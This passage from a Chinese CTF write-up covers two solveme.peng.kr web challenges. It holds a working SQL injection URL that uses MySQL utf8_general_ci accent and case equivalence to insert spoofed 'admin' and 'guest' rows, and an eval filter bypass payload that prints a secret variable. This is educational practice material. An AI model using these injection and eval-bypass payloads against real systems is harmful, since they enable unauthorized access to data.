latin1                     |</span><br><span class="line">| character_set_system     | utf8                       |</span><br><span class="line">| character_sets_dir       | &#x2F;usr&#x2F;share&#x2F;mysql&#x2F;charsets&#x2F; |</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">8 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">character_set_server：默认的内部操作字符集</span><br><span class="line">character_set_client：客户端来源数据使用的字符集</span><br><span class="line">character_set_connection：连接层字符集</span><br><span class="line">character_set_results：查询结果字符集</span><br><span class="line">character_set_database：当前选中数据库的默认字符集</span><br><span class="line">character_set_system：系统元数据(字段名等)字符集</span><br></pre></td></tr></table></figure>
<p>当我们set names utf8;：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set names utf8;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#39;character_set_%&#39;;</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">| Variable_name            | Value                      |</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">| character_set_client     | utf8                       |</span><br><span class="line">| character_set_connection | utf8                       |</span><br><span class="line">| character_set_database   | latin1                     |</span><br><span class="line">| character_set_filesystem | binary                     |</span><br><span class="line">| character_set_results    | utf8                       |</span><br><span class="line">| character_set_server     | latin1                     |</span><br><span class="line">| character_set_system     | utf8                       |</span><br><span class="line">| character_sets_dir       | &#x2F;usr&#x2F;share&#x2F;mysql&#x2F;charsets&#x2F; |</span><br><span class="line">+--------------------------+----------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>被成功更改的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">character_set_client </span><br><span class="line">character_set_connection</span><br><span class="line">character_set_results</span><br></pre></td></tr></table></figure>
<p>而：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">character_set_database</span><br><span class="line">character_set_server</span><br></pre></td></tr></table></figure>
<p>依旧为lantin1<br>关于mysql字符集：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.laruence.com&#x2F;2008&#x2F;01&#x2F;05&#x2F;12.html</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">将操作结果从内部操作字符集转换为character_set_results。</span><br></pre></td></tr></table></figure>
<p>即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; 内部操作字符集</span><br></pre></td></tr></table></figure>
<p>p神介绍的ctf题是因为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utf8-&gt;utf8-&gt;latin1</span><br></pre></td></tr></table></figure>
<p><strong>mysql处理’admin%c2’时在转换成lantin1字符时将不完整编码的%c2忽略了</strong><br>而这里无法bypass<br>这里注意到：<br><strong>utf8编码和默认collation字符顺序下不同编码字符被认为相等的特性</strong><br>即可能使mysql不区分à与a的问题<br>character set与collation的关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql 有两个支持 unicode 的 character set:</span><br><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。</span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure>
<p>在源码的sql文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure>
<p>在mysql下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show collation where collation like &#39;%utf8%&#39;;</span><br><span class="line">+--------------------------+---------+-----+---------+----------+---------+</span><br><span class="line">| Collation                | Charset | Id  | Default | Compiled | Sortlen |</span><br><span class="line">+--------------------------+---------+-----+---------+----------+---------+</span><br><span class="line">| utf8_general_ci          | utf8    |  33 | Yes     | Yes      |       1 |</span><br><span class="line">| utf8_bin                 | utf8    |  83 |         | Yes      |       1 |</span><br><span class="line">| utf8_unicode_ci          | utf8    | 192 |         | Yes      |       8 |</span><br><span class="line">| utf8_icelandic_ci        | utf8    | 193 |         | Yes      |       8 |</span><br><span class="line">| utf8_latvian_ci          | utf8    | 194 |         | Yes      |       8 |</span><br><span class="line">| utf8_romanian_ci         | utf8    | 195 |         | Yes      |       8 |</span><br><span class="line">| utf8_slovenian_ci        | utf8    | 196 |         | Yes      |       8 |</span><br><span class="line">| utf8_polish_ci           | utf8    | 197 |         | Yes      |       8 |</span><br><span class="line">| utf8_estonian_ci         | utf8    | 198 |         | Yes      |       8 |</span><br><span class="line">| utf8_spanish_ci          | utf8    | 199 |         | Yes      |       8 |</span><br><span class="line">| utf8_swedish_ci          | utf8    | 200 |         | Yes      |       8 |</span><br><span class="line">| utf8_turkish_ci          | utf8    | 201 |         | Yes      |       8 |</span><br><span class="line">| utf8_czech_ci            | utf8    | 202 |         | Yes      |       8 |</span><br><span class="line">| utf8_danish_ci           | utf8    | 203 |         | Yes      |       8 |</span><br></pre></td></tr></table></figure>
<p>若不指定collation则默认选择为utf8_general_ci<br>collation名字的规则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;character set&gt;_&lt;language&#x2F;other&gt;_&lt;ci&#x2F;cs&gt;</span><br><span class="line">2. &lt;character set&gt;_bin</span><br></pre></td></tr></table></figure>
<p>其中ci是case insensitive的缩写，即大小写不敏感<br>所以这里我们得知utf8_general_ci的字符顺序下，大小写是不敏感的，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x3D; ADmIn</span><br></pre></td></tr></table></figure>
<p>官方手册:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dev.mysql.com&#x2F;doc&#x2F;refman&#x2F;5.7&#x2F;en&#x2F;charset-unicode-sets.html</span><br></pre></td></tr></table></figure>
<p>看到utf8_general_ci是不支持扩展，缩小或可忽略字符的传统归类。它只能进行字符之间的一对一比较<br>在官方文档中举例说明，对于utf8_general_ci:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ä &#x3D; A</span><br><span class="line">Ö &#x3D; O</span><br><span class="line">Ü &#x3D; U</span><br></pre></td></tr></table></figure>
<p>在The Unicode Collation Algorithm（unicode排序算法)中<br>详细介绍了在需要保持符合Unicode标准的要求的时候，如何比对两个unicode字符串：<br>在它的默认样例中我们得知如下顺序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.alphabetic ordering</span><br><span class="line">2.diacritic ordering</span><br><span class="line">3.case ordering.</span><br></pre></td></tr></table></figure>
<p>其中diacritic ordering指明了读音符号的排序<br>故而使得Ä = A<br>具体读音符号的替换表格：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;collation-charts.org&#x2F;mysql60&#x2F;mysql604.utf8_general_ci.european.html</span><br></pre></td></tr></table></figure>
<p>最终：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1</span><br><span class="line">guest:%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; vps_ip;</span><br><span class="line">$time &#x3D;time();</span><br><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;cheaplottery.solveme.peng.kr&#x2F;index.php?lottery%5BA%5D&#x3D;1&#39;),(&#39;%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1_&quot;.$a.&quot;&#39;,&#39;$time&#39;,&#39;1,1,1,1,1&#39;),(&#39;%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3_&quot;.$a.&quot;&#39;,&#39;$time&#39;,&#39;1,1,1,1,1&#39;)%23&amp;lottery%5BB%5D&#x3D;&amp;lottery%5BC%5D&#x3D;&amp;lottery%5BD%5D&#x3D;&amp;lottery%5BE%5D&#x3D;&quot;;</span><br><span class="line">echo $url;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>在vps端:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;cheaplottery.solveme.peng.kr&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>回显即得flag</p>
<h2 id="0x12-Check-via-eval"><a href="#0x12-Check-via-eval" class="headerlink" title="0x12 Check via eval"></a>0x12 Check via eval</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   $exam &#x3D; &#39;return\&#39;&#39;.sha1(time()).&#39;\&#39;;&#39;;</span><br><span class="line"></span><br><span class="line">   if (!isset($_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">       echo &#39;&lt;a href&#x3D;&quot;.&#x2F;?flag&#x3D;&#39;.$exam.&#39;&quot;&gt;Click here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line">   else if (strlen($_GET[&#39;flag&#39;]) !&#x3D; strlen($exam)) &#123;</span><br><span class="line">       echo &#39;Not allowed length&#39;;</span><br><span class="line">   &#125;</span><br><span class="line">   else if (preg_match(&#39;&#x2F;&#96;|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit&#x2F;is&#39;, $_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">       echo &#39;Not allowed keyword&#39;;</span><br><span class="line">   &#125;</span><br><span class="line">   else if (eval($_GET[&#39;flag&#39;]) &#x3D;&#x3D;&#x3D; sha1($flag)) &#123;</span><br><span class="line">       echo $flag;</span><br><span class="line">   &#125;</span><br><span class="line">   else &#123;</span><br><span class="line">       echo &#39;What\&#39;s going on?&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>看到关键：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_GET[&#39;flag&#39;])</span><br></pre></td></tr></table></figure>
<p>我们只需构造语句输出flag即可<br>在前面看到其对flag值进行了过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;&#96;|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit&#x2F;is&#39;, $_GET[&#39;flag&#39;])</span><br></pre></td></tr></table></figure>
<p>想到之前的一道webshell：<br>echo可以使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&quot;something&quot;?&gt;</span><br></pre></td></tr></table></figure>
<p>文档中说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 PHP 5.4.0 之前，必须在php.ini 里面启用short_open_tag才有效</span><br></pre></td></tr></table></figure>
<p>不过这里不能直接构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&lt;?&#x3D;$flag?&gt;)</span><br></pre></td></tr></table></figure>
<p>类似上面的short_open_tag，在eval中，可以使用:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;$flag;</span><br></pre></td></tr></table></figure>
<p>输出变量<br>由于源码过滤了字符串”flag”,我们拆开bypass即可<br>同时需要注意strlen($_GET[‘flag’]) != strlen($exam):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?flag&#x3D;$kirin&#x3D;&#39;klag&#39;;$kirin&#123;0&#125;&#x3D;&#39;f&#39;;?&gt;&lt;?&#x3D;$&#123;$kirin&#125;;11111;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Warm-up"><span class="toc-number">1.</span> <span class="toc-text">0x01 Warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Thirty-six"><span class="toc-number">2.</span> <span class="toc-text">0x02  Thirty six</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Bad-compare"><span class="toc-number">3.</span> <span class="toc-text">0x03 Bad compare</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Winter-sleep"><span class="toc-number">4.</span> <span class="toc-text">0x04  Winter sleep</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Hard-login"><span class="toc-number">5.</span> <span class="toc-text">0x05 Hard login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-URL-filtering"><span class="toc-number">6.</span> <span class="toc-text">0x06 URL filtering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Hash-collision"><span class="toc-number">7.</span> <span class="toc-text">0x07  Hash collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Array2String"><span class="toc-number">8.</span> <span class="toc-text">0x08  Array2String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-Give-me-a-link-2"><span class="toc-number">9.</span> <span class="toc-text">0x09 Give me a link 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-Give-me-a-link"><span class="toc-number">10.</span> <span class="toc-text">0x0A Give me a link</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-Replace-filter"><span class="toc-number">11.</span> <span class="toc-text">0x0B Replace filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-Hell-JS"><span class="toc-number">12.</span> <span class="toc-text">0x0C Hell JS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-Anti-SQLi"><span class="toc-number">13.</span> <span class="toc-text">0x0D Anti SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E-Name-check"><span class="toc-number">14.</span> <span class="toc-text">0x0E Name check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F-Super-secure-hash"><span class="toc-number">15.</span> <span class="toc-text">0x0F Super secure hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-I-am-slowly"><span class="toc-number">16.</span> <span class="toc-text">0x10  I am slowly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-Cheap-lottery"><span class="toc-number">17.</span> <span class="toc-text">0x11 Cheap lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-Check-via-eval"><span class="toc-number">18.</span> <span class="toc-text">0x12 Check via eval</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&text=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&is_video=false&description=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=solveme.peng.kr_Web代码审计练习&body=Check out this article: http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&title=solveme.peng.kr_Web代码审计练习" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/10/solveme-peng-kr-Web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/&name=solveme.peng.kr_Web代码审计练习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


